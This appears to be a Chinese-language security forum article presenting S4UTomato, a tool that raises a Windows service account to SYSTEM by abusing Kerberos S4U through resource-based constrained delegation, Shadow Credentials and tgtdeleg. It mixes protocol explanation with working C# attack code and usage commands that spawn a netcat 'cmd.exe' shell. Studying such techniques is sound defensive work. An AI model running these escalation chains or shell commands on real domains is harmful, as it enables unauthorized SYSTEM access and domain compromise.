# S4UTomato - Escalate Service Account To LocalSystem via Kerberos

> **来源**: https://forum.butian.net/share/2461  
> **文章ID**: 2461

---

Traditional Potatoes
====================

熟悉 “Potato” 系列提权的朋友应该知道，它可以将服务账户权限提升至本地系统权限。“Potato” 早期的利用思路几乎都是相同的：利用 COM 接口的一些特性，欺骗 NT AUTHORITY\\SYSTEM 账户连接并验证到攻击者控制的 RPC 服务器。然后通过一系列 API 调用对这个认证过程执行中间人（NTLM Relay）攻击，并为 NT AUTHORITY\\SYSTEM 账户在本地生成一个访问令牌。最后窃取这个令牌，并使用 `CreateProcessWithToken()` 或 `CreateProcessAsUser()` 函数传入令牌创建新进程，以获取 SYSTEM 权限。

How About Kerberos
==================

在任何机器加入域的情况下，只要能够以 Windows 服务账户或 Microsoft 虚拟帐户的身份运行代码，你都可以利用上述技巧进行本地特权提升，前提是 Active Directory 没有被加固以完全防范上述攻击。

在 Windows 域环境中，SYSTEM、NT AUTHORITY\\NETWORK SERVICE 和 Microsoft 虚拟帐户都被用作加入域的系统计算机帐户进行身份验证。理解这一点非常重要，因为在现代 Windows 版本中，大多数 Windows 服务默认使用 Microsoft 虚拟帐户运行。其中最值得注意的是 IIS 和 MSSQL，但我相信还有其他应用也在使用这些虚拟帐户。因此，我们可以滥用 S4U 扩展，获取到域管理员账户 Administrator 针对本地计算机的服务票据，然后借助 James Forshaw（[@tiraniddo](https://twitter.com/tiraniddo)）的 [*SCMUACBypass*](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82) 使用该票据创建系统服务，以获取 SYSTEM 权限。这可以达到与传统的 “Potato” 家族提权方法相同的效果。

在此之前，我们需要获得本地计算机账户的 TGT。这并不容易，由于服务账户权限的限制，我们无法获取计算机的 Long-term Key，也就无法构造 KRB\_AS\_REQ 请求。因此，为了达到上述目的，我借助了基于资源的约束委派、Shadow Credentials 和 Tgtdeleg 三个技巧，并基于 [Rubeus](https://github.com/GhostPack/Rubeus#tgtdeleg) 工具集构建了我的项目：[S4UTomato](https://github.com/wh0amitz/S4UTomato)。

S4U
---

S4U 指定 Kerberos 协议扩展：用户服务和约束委派协议，这是 Microsoft 在其 [*\[MS-SFU\]: Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol*](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94) 协议中为 Kerberos 协议开发的扩展协议。S4U 提供了两个扩展 S4U2self 和 S4U2proxy，使应用程序服务能够代表用户获取 Kerberos 服务票证。

总的来说，这两个扩展使应用程序服务能够代表用户获取 Kerberos 服务票证。 生成的服务票可用于：

- 请求服务自己的信息。
- 服务机器的本地访问控制，模拟用户。
- 代表用户请求其他服务。

### S4U2self

S4U2self（Service for User to Self） 扩展允许服务代表用户获取其自身的 Kerberos 服务票证。这使得服务能够获取用户的授权数据，然后将其用于本地服务中的授权决策。KDC 使用用户名和领域来识别用户。或者，可以基于用户的证书来识别用户。Kerberos 票证授予服务的 KRB\_TGS\_REQ 和 KRB\_TGS\_REP 消息两个新数据结构之一一起使用。 当 KDC 通过用户名和领域名称识别用户时，将使用新的 `PA-FOR-USER` 数据结构。 另一种结构 `PA-S4U-X509-USER` 在将用户证书提交给 KDC 以获得授权信息时使用。通过代表用户获取自身的服务票证，服务可以接收到票证中的用户授权数据。

S4U2self 扩展旨在当用户以 Kerberos 以外的其他方式对服务进行身份验证时使用。例如，用户可以通过 Web 服务器私有的某种方式向 Web 服务器进行身份验证。然后，Web 服务器可以使用 S4U2self 获取带有授权数据的票证，就像用户最初使用 Kerberos 一样。所有决策路径的行为就像使用 Kerberos 一样，这简化了服务器的授权决策。

### S4U2proxy

S4U2proxy（Service for User to Proxy）扩展使服务能够代表用户获取第二个后端服务的服务票证，此功能称为约束委派。这允许后端服务使用 Kerberos 用户凭据，就好像用户已获取服务票证并将其直接发送到后端服务一样。票证授予服务（TGS）上的本地策略可用于限制 S4U2proxy 扩展的范围。Kerberos 票证授予服务的 KRB\_TGS\_REQ 和 KRB\_TGS\_REP 消息与新的 `CNAME-IN-ADDL-TKT` 和 `S4U_DELEGATION_INFO` 数据结构一起使用。 第二服务通常是代表第一服务执行某些工作的代理，并且代理在用户的授权上下文中执行该工作。

S4U2proxy 扩展要求第一个服务的服务票证设置了可转发标志（Forwardable）。这张票据可以通过 S4U2self 协议交换获得。

使用 S4U2proxy 委派和转发 TGT 委派机制时，当服务器模拟客户端并在远程服务器上执行操作（例如 `ldap_bind()` 或 `RPC_bind()`）时，会调用委派。Kerberos SSP 首先会通过检查本地票据缓存中是否有 forwarded-TGT，来检测 forwarded-TGT 委托机制是否可用；如果没有 forwarded-TGT，Kerberos SSP 将尝试执行 S4U2proxy 委派。

Resource-Based Constrained Delegation (RBCD)
--------------------------------------------

基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是在 Windows Server 2012 中新引入的功能，与传统的约束委派相比，它不再需要拥有 SeEnableDelegationPrivilege 特权的域管理员去设置相关属性，并且将设置委派的权限交换给了服务资源自身，即服务自己可以决定谁可以对我进行委派。

这里就用到了 S4U2self 和 S4U2proxy 两个扩展。下图可以表示（基于资源的）约束委派的执行流程。

![image-20230713131009369](images/attach-6682264b47e5d6530502e3aa834ce785dbd9887e.png)

S4U2self 的描述如上图上半部分所示。 使用此扩展，服务会收到服务本身的服务票证（该票证不能在其他地方使用）。上图描述了以下协议步骤：

1. 用户机器向 Service 1 发出请求，用户通过了认证，但 Service 1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 之外的某些方式执行的。
2. Service 1 已通过 KDC 进行身份验证并获得其自身的 TGT，它通过 S4U2self 扩展代表指定用户向其自身请求服务票证。用户由 S4U2self 数据中的用户名和用户领域名来标识。或者，如果 Service 1 拥有用户的证书，则它可以使用该证书通过 `PA-S4U-X509-USER` 结构向 KDC 识别用户。
3. KDC 返回一个寻址到 Service 1 的服务票据，就像用户使用用户自己的 TGT 请求的一样。服务票证可能包含用户的授权数据。
4. Service 1 可以使用服务票据中的授权数据来满足用户的请求。然后该服务响应用户。尽管 S4U2self 向 Service 1 提供有关用户的信息，但此扩展不允许 Service 1 代表用户向其他服务发出请求。这就到了 S4U2proxy 发挥作用的时间了。S4U2proxy 的描述如上图下半部分所示。
5. 用户机器向 Service 1 发出请求，Service 1 需要以用户身份访问 Service 2 上的资源。 但是， Service 1 没有来自用户转发来的 TGT（forwarded-TGT）以通过转发 TGT 执行委派。此步骤适用两个先决条件。首先，Service 1 已通过 KDC 进行身份验证并拥有有效的 TGT。其次，服务 1 具有从用户到 Service 1 的可转发服务票证。此可转发服务票证可能已通过 KRB\_AP\_REQ 消息或通过 S4U2self 请求获取。
6. Service 1 代表指定用户向服务 2 请求服务票证。通过 Service 1 的服务票证中的客户端名称和客户端领域进行标识用户。要返回的票证中的授权数据也从服务票证中复制。
7. 如果请求中包含特权属性证书（PAC），则 KDC 通过检查 PAC 结构的签名数据来验证 PAC。如果 PAC 有效或不存在，KDC 将返回 Service 2 的服务票证，但存储在服务票证的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 Service 1 的身份。
8. Service 1 使用服务票证向 Service 2 发出请求。Service 2 将此请求视为来自用户，并假设该用户已通过 KDC 进行身份验证。
9. Service 2 响应请求。
10. Service 1 响应消息 5 中的用户请求。

在 RBCD 中，需要在 Service 2 上将 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性值设为 Service 1 的 SID，以允许 Service 1 对 Service 2 上的服务进行委派。由于计算机帐户对自身的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性有 WriteProperty 权限，因此可以通过设置该属性执行 RBCD 提权。

我们首先需要以计算机账户的身份连接到 LDAP，并创建一个新的计算机对象，可以借助 Windows .NET API 提供的 `System.DirectoryServices.Protocols.LdapConnection` 和 `System.DirectoryServices.Protocols.AddRequest` 接口完成该操作。

```c#
// ...

LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, port);
LdapConnection connection = new LdapConnection(identifier);

// ...

AddRequest addRequest = new AddRequest(NewComputersDN, new DirectoryAttribute[] {
    new DirectoryAttribute("DnsHostName", computerName + "." + domain),
    new DirectoryAttribute("SamAccountName", computerName + "$"),
    new DirectoryAttribute("userAccountControl", "4096"),
    new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + computerPassword + "\"")),
    new DirectoryAttribute("objectClass", "Computer"),
    new DirectoryAttribute("ServicePrincipalName", "HOST/" + computerName + "." + domain, "RestrictedKrbHost/" + computerName + "." + domain, "HOST/" + computerName, "RestrictedKrbHost/" + computerName)
});

try
{
    connection.SendRequest(addRequest);
    Console.WriteLine($"[*] Computer account {computerName}$ added with password {computerPassword}.");
}
catch (Exception ex)
{
    // ...
}
```

然后通过一个查询请求，获取新添加的计算机对象的 SID 并返回，并通过 `System.DirectoryServices.Protocols.ModifyRequest` 接口将新计算机账户的 SID 添加到目标计算机账户（也就是当前计算机账户）的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中，以设置从新机器帐户到目标计算机帐户的基于资源的约束委派，如下所示。

```c#
entry = Ldap.LocateAccount(computerName + "$", domain, domainController);
if (entry != null)
{
    try
    {
        securityIdentifier = new SecurityIdentifier(entry.Properties["objectSid"][0] as byte[], 0);
        Console.WriteLine($"[*] Sid of the new computer account: {securityIdentifier.Value}");
    }
    catch
    {
        Console.WriteLine("[-] Can not retrieve the sid");
    }
}

// ...

string nTSecurityDescriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + securityIdentifier + ")";
RawSecurityDescriptor rawSecurityIdentifier = new RawSecurityDescriptor(nTSecurityDescriptor);
byte[] descriptorBuffer = new byte[rawSecurityIdentifier.BinaryLength];
rawSecurityIdentifier.GetBinaryForm(descriptorBuffer, 0);

ModifyRequest modifyRequest = new ModifyRequest(TargetComputerDN, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptorBuffer);
try
{
    ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
    Console.WriteLine($"[*] {computerName}$ can now impersonate users on {TargetComputerDN} via S4U2Proxy");
}
catch
{
    Console.WriteLine("[-] Could not modify attribute msDS-AllowedToActOnBehalfOfOtherIdentity, check that your user has sufficient rights");
}

// ...
```

最后，调用 Rubeus 工具集提供的 `S4U.Execute()` 方法分别执行 S4U2self 和 S4U2proxy 过程，如下所示。这将代表域管理员用户申请到针对当前计算机上 HOST 服务的票据，并将其提交到内存中。

```c#
// ...

S4U.Execute(computerName, domain, computerHash, encType, targetUser, targetSPN, ptt: true, domainController: domainController);

// ...
```

得到服务票据后，通过 SCMUACBypass 访问 Service Control Manager（SCM）创建系统服务，从而获取 SYSTEM 权限，执行效果如下所示。

```console
S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.exe"
```

![rbcd](images/attach-a233e72604b097bdc278aae2b41da5fb1a782b95.gif)

Shadow Credentials
------------------

在 [Black Hat Europe 2019](https://www.dsinternals.com/wp-content/uploads/eu-19-Grafnetter-Exploiting-Windows-Hello-for-Business.pdf) 大会期间，Michael Grafnetter（[@MGrafnetter](https://twitter.com/MGrafnetter)）讨论了针对 Windows Hello for Business 技术的多种攻击方法，其中包括域持久化技术。该技术涉及修改目标计算机账户或用户帐户的 `msDS-KeyCredentialLink` 属性，以获得用于检索 NTLM 哈希值和请求 TGT 票据。即使目标帐户的密码被修改后，该属性也不会受到影响，因此，攻击者可以使用该技术完美的实现域持久性。

与设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 相似，计算机账户对自身的 `msDS-KeyCredentialLink` 属性拥有 WriteProperty 权限。我们可以在服务帐户的上下文中连接到活动目录，为当前计算机对象的 `msDS-KeyCredentialLink` 属性写入一个新的 `Key Credential` 以请求 TGT 票据，并最终通过 S4U2Self 提升至 SYSTEM 权限。

### What is PKINIT ?

PKINIT 是 Kerberos 协议的扩展协议，允许在身份验证阶段使用数字证书。这种技术可以用智能卡或 USB 类型的身份验证代替基于密码的身份验证。PKINIT 协议允许在 Kerberos 协议的初始（预）身份验证交换中使用公钥加密，通过使用公钥加密来保护初始身份验证，Kerberos 协议得到了显着增强，并且可以与现有的公钥身份验证机制（例如智能卡）一起使用。

在传统的 Kerberos 身份验证中，客户端必须在 KDC 为其提 TGT 票据之前执行 “预身份验证”，该票证随后可用于获取服务票证。客户端使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明他们拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。

对称密钥方法是使用最广泛和已知的一种方法，它使用从客户端密码派生的对称密钥（AKA 密钥）。如果使用 RC4 加密，此密钥将是客户端密码的哈希值。KDC 拥有客户端密钥的副本，并且可以解密预身份验证的数据以对客户端进行认证。KDC 使用相同的密钥来加密与 TGT 一起发送给客户端的会话密钥。

![img](images/attach-52dd159df4c4bf34e0e10671ad70f5a2eb770574.png)

PKINIT 是不太常见的非对称密钥方法。客户端有一个公/私密钥对，并用他们的私钥对预验证数据进行加密，KDC 用客户端的公钥对其进行解密。KDC 还有一个公/私密钥对，允许使用以下两种方法之一交换会话密钥：

1. **Diffie-Hellman Key Delivery**
    
    该方法允许 KDC 和客户端安全地建立共享会话密钥，即使攻击者拥有客户端或 KDC 的私钥。会话密钥将存储在 TGT 的加密部分，它是用 Krbtgt 帐户的密钥（哈希）加密的。
2. **Public Key Encryption Key Delivery**
    
    该方法使用 KDC 的私钥和客户端的公钥来封装由 KDC 生成的会话密钥。

传统上，公钥基础设施（PKI）允许 KDC 和客户端使用由双方先前已与证书颁发机构（CA）建立信任的实体签署的数字证书以交换他们的公钥。这是证书信任（Certificate Trust）模型，最常用于智能卡身份验证。

![img](images/attach-4efc5f6e5ab6848a2f4e7840cead6cc19e5c765a.png)

Microsoft 还引入了密钥信任（Key Trust）的概念，以在不支持 Certificate Trust 的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。

客户端的公钥存储在一个名为 `msDS-KeyCredentialLink` 的多值属性中，该属性在 Windows Server 2016 中引入。该属性的值是 Key Credentials，它是包含创建日期、所有者可分辨名称等信息的序列化对象，一个代表设备 ID 的 GUID，当然还有公钥。

当客户端登录时，Windows 会尝试使用其私钥执行 PKINIT 身份验证。在 Key Trust 模型下，域控制器可以使用存储在客户端 `msDS-KeyCredentialLink` 属性中的原始公钥解密其预身份验证数据。

![img](images/attach-15b27af1f6a29a540f56e48f90ae5d951c939c45.png)

这种信任模型消除了使用无密码身份验证必须为每个人颁发客户端证书的需要。但是，域控制器仍需要用于会话密钥交换的证书。

这意味着如果我们可以写入用户的 `msDS-KeyCredentialLink` 属性，那么就可以获得该用户的 TGT。

下面，我们将基于 Rubeus 和 Michael Grafnetter（[@MGrafnetter](https://twitter.com/MGrafnetter)）的 [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) 库实现这种技术。这将为当前计算机生成一个自签名证书和 Key Credential，并将 Key Credential 信息存储在当前计算机的 `msDS-KeyCredentialLink` 属性中。生成的证书可以与 Rubeus 提供的 `Ask.TGT()` 方法一起使用，以请求 TGT 票据并进一步扩大攻击。

首先，我们创建一个 `GenerateSelfSignedCert()` 方法，通过 `System.Security.Cryptography.X509Certificates.CertificateRequest` 类为当前计算机创建一个自签名的 X509 证书。

```c#
private static X509Certificate2 GenerateSelfSignedCert(string cn)
{
    // UseMachineKeyStore: https://stackoverflow.com/questions/1102884/rsacryptoserviceprovider-cryptographicexception-system-cannot-find-the-file-spec
    CspParameters csp = new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString());
    csp.Flags = CspProviderFlags.UseMachineKeyStore;
    RSA rsa = new RSACryptoServiceProvider(2048, csp);
    CertificateRequest req = new CertificateRequest(String.Format("cn={0}", cn), rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
    X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
    return cert;
}
```

在代码中，我们使用了 `CspParameters` 类来配置 RSA 密钥容器的参数，以及密钥存储的位置。然后，我们创建了一个 2048 位的 RSA 密钥对，并将其用于创建一个 `CertificateRequest` 证书请求对象。最后，我们通过调用 `CreateSelfSigned` 方法，生成并返回证书。

然后，通过 [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) 库提供的 `KeyCredential` 类，利用之前生成的自签名证书（公钥）、随机生产的 GUID、当前计算机对象的 `distinguishedName` 属性，以及当前日期时间，初始化一个 Key Credential 对象。。

```c#
X509Certificate2 cert = GenerateSelfSignedCert(targetComputer);

// ...

Guid guid = Guid.NewGuid();
KeyCredential keyCredential = new KeyCredential(cert, guid, targetObject.Properties["distinguishedName"][0].ToString(), DateTime.Now);
Console.WriteLine("[*] KeyCredential generated with DeviceID {0}", guid.ToString());

// ... 

try
{
    Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
    targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
    targetObject.CommitChanges();
    Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
}
catch (Exception e)
{
    // ... 
}
```

接着，将 X509 数字证书转换为 PFX（PKCS#12）格式的字节数组，并使用给定的密码保护该 PFX。然后，将 PFX 格式的证书字节数组转换为 Base64 字符串，并传递到 Rubeus 提供的 `Ask.TGT()` 方法中，以请求 TGT 票据。

```c#
byte[] certBytes = cert.Export(X509ContentType.Pfx, password);
string certString = Convert.ToBase64String(certBytes);

// ...
// base64Certificate = certString

string targetUser = $"{domain}\\Administrator";
string targetSPN = "";
string altService = $"HOST/{Environment.MachineName}";
string outfile = "";
bool ptt = true;
bool self = true;
string keyString = "";

// ...

byte[] byteTgt = Ask.TGT(targetComputer, domain, base64Certificate, password, encType, "", ptt: true, domainController, luid, true, getCredentials: true);
```

最后，将返回的 TGT 字节数据转换为 KRB\_CRED 对象，并传入 Rubeus 提供的 `S4U.Execute` 方法执行 S4U2self 过程，以代表域管理员用户请求针对当前计算机上 HOST 服务的票据。

```c#
KRB_CRED kirbi = new KRB_CRED(byteTgt);

encType = Interop.KERB_ETYPE.subkey_keymaterial;
S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, null, null, null, self, false, false, keyString, encType);
```

请求到的服务票据将被提交到内存中，可以通过 SCMUACBypass 访问 Service Control Manager（SCM）创建系统服务，从而获取 SYSTEM 权限，执行效果如下所示。

```console
S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
```

![shadowcred](images/attach-80433448bfc9dfac6fb01609a9b96788ef59a479.gif)

Tgtdeleg
--------

Benjamin Delpy（[@gentilkiwi](https://github.com/gentilkiwi)）在其 [Kekeo](https://github.com/gentilkiwi/kekeo/blob/4fbb44ec54ff093ae0fbe4471de19681a8e71a86/kekeo/modules/kuhl_m_tgt.c#L189-L327) 中加入了一个技巧（tgtdeleg），允许你滥用无约束委派来获取一个带有会话密钥的本地 TGT。

<img src="C:\\Users\\whoami\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230728091637233.png" alt="image-20230728091637233" style="zoom:67%;" />

Tgtdeleg 通过滥用 Kerberos GSS-API，以获取当前用户的可用 TGT，而无需在主机上获取提升的权限。该方法使用 `AcquireCredentialsHandle` 函数获取当前用户的 Kerberos 安全凭据句柄，并使用 `ISC_REQ_DELEGATE` 标志和目标 SPN 为 `HOST/DC.domain.com` 调用 `InitializeSecurityContext` 函数，以准备发送给域控制器的伪委派上下文。这导致 GSS-API 输出中的 KRB\_AP-REQ 包含了在 Authenticator Checksum 中的 KRB\_CRED。然后，从本地 Kerberos 缓存中提取服务票据的会话密钥，并用它来解密 Authenticator 中的 KRB\_CRED，从而获得一个可用的 TGT。Rubeus 工具集种也融合了该技巧，具体细节请参考 “[*Rubeus – Now With More Kekeo*](https://blog.harmj0y.net/redteaming/rubeus-now-with-more-kekeo/#tgtdeleg)”。

我们可以在服务账户的上下文中，利用 Rubeus 提供的 `LSA.RequestFakeDelegTicket()` 方法执行 tgtdeleg 技巧，以检索计算机账户的 TGT 并保存在 `blah` 字节数组中，如下所示。

```c#
// ...

Console.WriteLine("[*] Action: Request Fake Delegation TGT (current user)");
byte[] blah = LSA.RequestFakeDelegTicket();

// ...
```

将返回的 TGT 字节数据转换为 KRB\_CRED 对象，并传入 Rubeus 提供的 `S4U.Execute` 方法执行 S4U2self 过程，以代表域管理员用户请求针对当前计算机上 HOST 服务的票据，并将请求到的服务票据将被提交到内存中。

```c#
string targetUser = $"{domain}\\Administrator";
string targetSPN = "";
string altService = $"HOST/{Environment.MachineName}";
string outfile = "";
bool ptt = true;
bool self = true;
string keyString = "";

// ...

KRB_CRED kirbi = new KRB_CRED(blah);

S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, null, null, null, self, false, false, keyString, encType);
```

最终通过 SCMUACBypass 访问 Service Control Manager（SCM）创建系统服务，从而获取 SYSTEM 权限，执行效果如下所示。

```console
# 先通过 Tgtdeleg 检索 TGT
S4UTomato.exe tgtdeleg
# 再执行 SCMUACBypass 获取 SYSTEM 权限
S4UTomato.exe krbscm -c "nc 127.0.0.1 4444 -e cmd.exe"
```

![tgtdeleg](images/attach-593cb3ca003924e7ae628aa489e1f6415fbd113e.gif)
